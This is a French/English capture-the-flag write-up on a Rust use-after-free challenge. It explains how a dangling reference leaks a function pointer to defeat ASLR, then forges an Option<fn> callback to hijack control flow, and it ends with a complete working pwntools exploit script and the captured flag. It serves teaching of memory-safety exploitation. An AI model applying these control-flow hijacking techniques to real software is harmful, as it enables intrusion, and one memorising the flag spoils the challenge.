# Unsound Memories -- Flag 2

## Write-up (FR)

### Point de départ

Le Flag 1 a établi un fait essentiel : une référence suspendue (`ref`) et un
`AdminRecord` alloué ensuite peuvent **partager le même bloc mémoire**, car
`alloc_ref()` libère son `Box` tout en conservant une référence de durée de vie
`'static` (le trou de soundness de `cache_ref`). Écrire dans le `ref` modifie
donc l'`AdminRecord` aliasé.

Pour le Flag 1, on s'est servi de cette primitive pour écrire `is_admin = 1`.
La question devient : que peut-on faire de plus avec la même primitive ?

### Analyse du code : un appel indirect

En relisant `admin_show()`, une ligne attire l'attention :

```rs
pub fn admin_show<W: Write>(&self, index: usize, w: &mut W) -> Result<(), Error> {
    match self.admins.get(index) {
        Some(Some(admin)) => {
            writeln!(w, "Is admin : {}", admin.is_admin)?;
            w.flush()?;

            if let Some(cb) = admin.callback {
                cb(&**admin as *const AdminRecord as *const u8);
            }
            Ok(())
        }
        ...
    }
}
```

Si `admin.callback` contient `Some(fonction)`, cette fonction est **appelée**.
Contrôler la valeur de `callback`, c'est contrôler le flot d'exécution.

L'objectif devient :

> Écrire l'adresse d'une fonction utile dans `admin.callback`,
> puis déclencher `admin_show` pour l'exécuter.

### Analyse de la structure : la disposition mémoire

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,                    // offset 0
    callback: Option<fn(*const u8)>,  // offset 8
    username: [u8; BUFFER_SIZE - 16], // offset 16
}
```

`#[repr(C)]` fixe la disposition : `is_admin` à l'offset 0, `callback` à
l'offset 8. Pour le Flag 1, on écrivait à l'offset 0. Ici, c'est l'offset 8 qui
nous intéresse.

### Le point clé : comment Rust représente `Option<fn>`

C'est ici que se trouve le cœur du challenge.

Un `Option<u32>` occupe normalement plus de place que `u32`, car Rust doit
stocker un *discriminant* indiquant si la valeur est `Some` ou `None`. Mais pour
`Option<fn(...)>`, ce n'est pas le cas.

Un pointeur de fonction est **garanti non-nul** par Rust. Le compilateur exploite
cette garantie via la *niche optimization* : il utilise la valeur impossible
(zéro) pour encoder `None`, et n'a donc besoin d'**aucun octet supplémentaire**.

Concrètement, le champ `callback` fait exactement 8 octets, et :

```text
callback = 0x0000000000000000   <=>   None
callback = <adresse non nulle>  <=>   Some(cette_adresse)
```

La conséquence est décisive :

> Écrire 8 octets non-nuls à l'offset 8 fabrique un `Some(f)` -- alors que le
> code Rust n'a JAMAIS construit ce `Some`.

C'est une confusion de type impossible à obtenir en Rust normal : on transforme
des octets bruts (vue `ref`) en un `Option<fn>` valide et appelable (vue
`AdminRecord`). Le même bloc mémoire est vu simultanément comme un tableau
d'octets et comme une structure typée.

### Trouver la cible : la fonction `win`

Le code source contient une fonction qui n'est appelée nulle part :

```rs
fn win(_ctx: *const u8) {
    if let Ok(flag) = std::fs::read_to_string("/flag2") {
        // imprime le flag
    }
}
```

`win` lit `/flag2` et l'imprime. Elle n'est jamais invoquée par le programme :
le seul moyen de l'atteindre est de détourner le flot d'exécution vers elle.

Si on écrit `&win` dans `callback`, alors `admin_show` exécutera `win` et le
flag s'imprime. Il reste à connaître l'adresse de `win`.

### L'obstacle : PIE et randomisation d'adresse

Le binaire est compilé en PIE (*Position Independent Executable*) : son adresse
de base change à chaque exécution (ASLR). On ne peut donc pas écrire l'adresse
de `win` en dur -- il faut d'abord **fuir** l'adresse de base du binaire.

C'est là qu'intervient un détail de `admin_new` :

```rs
self.admins.push(Some(Box::new(AdminRecord {
    is_admin: 0,
    callback: Some(banner),   // <-- callback non nul par defaut
    username: [0u8; BUFFER_SIZE - 16],
})));
```

Le callback par défaut n'est pas `None` mais `Some(banner)`, où `banner` est une
fonction inoffensive du binaire. Donc, dès la création, l'offset 8 de
l'`AdminRecord` contient l'**adresse runtime de `banner`** -- un pointeur de code.

Grâce au UAF, on lit cette adresse via la vue `ref` :

1. `New ref`    -> `ref[0]` aliase un chunk A
2. `New admin`  -> `admin[0]` réutilise A ; offset 8 = `&banner` (runtime)
3. `Show ref 0` -> hexdump du chunk ; octets 8..16 = `&banner`

L'adresse statique de `banner` (son offset dans le binaire, hors ASLR) se lit
par désassemblage du binaire fourni. On en déduit la base :

```text
base_PIE = banner_runtime - offset_statique(banner)
```

Vérification : `base_PIE` doit être alignée sur une page (`% 0x1000 == 0`).

### Calcul de l'adresse de `win`

Une fois la base connue :

```text
win_runtime = base_PIE + offset_statique(win)
```

`offset_statique(win)` se lit, comme pour `banner`, dans le binaire. (Dans le
binaire livré, strippé, `win` se reconnaît à son appel à `read_to_string` /
ouverture de `/flag2`.)

### Forge du `Some(win)`

On réécrit l'offset 8 du chunk avec l'adresse de `win`, via la vue `ref` :

```python
payload[0:8]  = struct.pack("<Q", 1)            # is_admin (preserve)
payload[8:16] = struct.pack("<Q", win_runtime)  # callback = Some(win)
```

Côté `AdminRecord`, `callback` vaut maintenant `Some(win)`.

### Déclenchement

`admin_show(0)` lit `Some(cb)` avec `cb == win`, et appelle `cb(ptr)`. `win`
lit `/flag2` et l'imprime.

> Détail sur l'alignement : l'appel indirect saute à l'entrée de `win`, une
> fonction Rust ordinaire dont le prologue rétablit l'alignement de pile avant
> tout appel interne. Viser une fonction du binaire (plutôt que `system()` de la
> libc, sensible à l'alignement de pile) évite tout problème d'exécution.

### Construction de l'exploit

1. Créer une référence suspendue (`New ref`).
2. Créer un administrateur (`New admin`) -> callback = `Some(banner)`.
3. Lire l'offset 8 via `Show ref` -> fuite de `&banner` -> base PIE.
4. (Flag 1) Écrire `is_admin = 1` à l'offset 0.
5. Calculer `&win = base_PIE + offset(win)`.
6. Écrire `&win` à l'offset 8 -> forge `Some(win)`.
7. Déclencher via `Show admin` -> `win()` imprime le flag.

## Write-up (EN)

### Starting point

Flag 1 established the key fact: a dangling reference (`ref`) and an
`AdminRecord` allocated afterwards can **share the same memory block**, because
`alloc_ref()` frees its `Box` while keeping a `'static` reference (the
`cache_ref` soundness hole). Writing through the `ref` mutates the aliased
`AdminRecord`.

Flag 1 used this to write `is_admin = 1`. The question now: what more can the
same primitive achieve?

### Code analysis: an indirect call

Re-reading `admin_show()`, one line stands out:

```rs
if let Some(cb) = admin.callback {
    cb(&**admin as *const AdminRecord as *const u8);
}
```

If `admin.callback` holds `Some(function)`, that function is **called**.
Controlling `callback` means controlling execution flow:

> Write the address of a useful function into `admin.callback`,
> then trigger `admin_show` to execute it.

### Struct layout

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,                    // offset 0
    callback: Option<fn(*const u8)>,  // offset 8
    username: [u8; BUFFER_SIZE - 16], // offset 16
}
```

`#[repr(C)]` fixes the layout: `is_admin` at 0, `callback` at 8. Flag 1 wrote at
offset 0; here we target offset 8.

### The key: how Rust represents `Option<fn>`

This is the heart of the challenge.

A function pointer is **guaranteed non-null** in Rust. The compiler uses this via
the *niche optimization*: it encodes `None` with the otherwise-impossible value
zero, needing **no extra discriminant byte**. The field is exactly 8 bytes:

```text
callback = 0x0000000000000000   <=>   None
callback = <non-zero address>   <=>   Some(that address)
```

Therefore:

> Writing 8 non-zero bytes at offset 8 forges a `Some(f)` -- which the Rust code
> NEVER constructed.

A type confusion impossible to obtain in normal Rust: raw bytes (the `ref` view)
become a valid, callable `Option<fn>` (the `AdminRecord` view). The same block is
seen as both an array of bytes and a typed struct.

### The target: function `win`

The source contains a function called nowhere:

```rs
fn win(_ctx: *const u8) {
    if let Ok(flag) = std::fs::read_to_string("/flag2") {
        // prints the flag
    }
}
```

`win` reads and prints `/flag2`. The only way to reach it is to hijack control
flow into it. Writing `&win` into `callback` makes `admin_show` execute `win`.

### The obstacle: PIE and ASLR

The binary is PIE: its base address is randomized each run. We can't hardcode
`win`'s address -- we must first leak the binary base.

`admin_new` helps:

```rs
callback: Some(banner),   // non-null default callback
```

The default callback is `Some(banner)` (a harmless function). From creation,
offset 8 of the record holds `banner`'s runtime address -- a code pointer. Leak
it via the `ref` view:

```text
New ref; New admin; Show ref 0   -> bytes 8..16 = &banner (runtime)
base_PIE = banner_runtime - static_offset(banner)   # must be page-aligned
```

### Computing `win`'s address

```text
win_runtime = base_PIE + static_offset(win)
```

In the stripped shipped binary, identify `win` by its `read_to_string` /
`/flag2` open call.

### Forging `Some(win)`

```python
payload[0:8]  = struct.pack("<Q", 1)            # is_admin (preserved)
payload[8:16] = struct.pack("<Q", win_runtime)  # callback = Some(win)
```

### Trigger

`admin_show(0)` calls `cb(ptr)` with `cb == win`; `win` prints `/flag2`.

> Alignment note: the indirect call lands at `win`'s entry, an ordinary Rust
> function whose prologue restores stack alignment before any inner call.
> Targeting a binary function (rather than alignment-sensitive libc `system()`)
> avoids any execution issue.

### Building the exploit

1. Create a dangling reference (`New ref`).
2. Allocate an administrator (`New admin`) -> callback = `Some(banner)`.
3. Read offset 8 via `Show ref` -> leak `&banner` -> PIE base.
4. (Flag 1) Write `is_admin = 1` at offset 0.
5. Compute `&win = base_PIE + offset(win)`.
6. Write `&win` at offset 8 -> forge `Some(win)`.
7. Trigger via `Show admin` -> `win()` prints the flag.

## Exploit

Le service lit des octets bruts via `prompt_bytes`. Les offsets statiques de
`banner` et `win` sont lus depuis un binaire de référence non-strippé (profil
`release-syms`), ce qui garde l'exploit reproductible.

```python
import re
import struct
import subprocess
from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
BINARY = args.BINARY or "./nanolog-release-syms"

def static_offset(binary, needle):
    out = subprocess.check_output(["nm", binary], text=True)
    for line in out.splitlines():
        if needle in line:
            return int(line.split()[0], 16)
    raise RuntimeError(f"symbole {needle} introuvable")

def parse_hexdump(raw):
    data = b""
    for line in raw.split(b"\n"):
        if b"|" not in line:
            continue
        for tok in line.split(b"|")[0].split()[1:]:
            try:
                data += bytes([int(tok, 16)])
            except ValueError:
                pass
    return data

def show_ref(p, i):
    p.sendline(b"6")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    return parse_hexdump(b"".join(p.recvline() for _ in range(9)))

def edit_ref(p, i, data):
    p.sendline(b"7")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.sendlineafter(b"Enter length: ", str(len(data)).encode())
    p.recvuntil(b"raw bytes: ")
    p.send(data)
    p.sendline(b"")
    p.recvline()

off_banner = static_offset(BINARY, "6banner")
off_win = static_offset(BINARY, "3win")

p = remote(HOST, PORT)

p.sendline(b"5")               # New ref   -> ref[0] = &A (dangling)
p.sendline(b"8")               # New admin -> admin[0] aliase A ; callback=Some(banner)

leaked = show_ref(p, 0)        # vue octets de l'AdminRecord
banner_rt = struct.unpack("<Q", leaked[8:16])[0]
base_pie = banner_rt - off_banner
assert base_pie % 0x1000 == 0, f"base PIE non alignee : {hex(base_pie)}"
win_rt = base_pie + off_win
log.success(f"base PIE = {hex(base_pie)}  &win = {hex(win_rt)}")

# Flag 1 : is_admin = 1 (callback preserve)
payload = bytearray(leaked)
payload[0:8] = struct.pack("<Q", 1)
edit_ref(p, 0, bytes(payload))
p.sendline(b"11")
p.sendlineafter(b"Enter index: ", b"0")
p.recvuntil(b"Congratulations! ")
log.success(f"Flag 1 : {p.recvline().strip().decode()}")

# Flag 2 : forge Some(win) a l'offset 8
payload[8:16] = struct.pack("<Q", win_rt)
edit_ref(p, 0, bytes(payload))
p.sendline(b"9")               # admin_show -> cb == win -> imprime /flag2
p.sendlineafter(b"Enter index: ", b"0")

data = p.recvall(timeout=3)
m = re.search(rb"DCI\{[^}]+\}", data)
log.success(f"Flag 2 : {m.group().decode() if m else 'introuvable'}")
p.close()
```

## Flag

`DCI{N4n0L0g_Opt1on_fn_F0rg3d_UdSHxt7n4eM95H4i}`
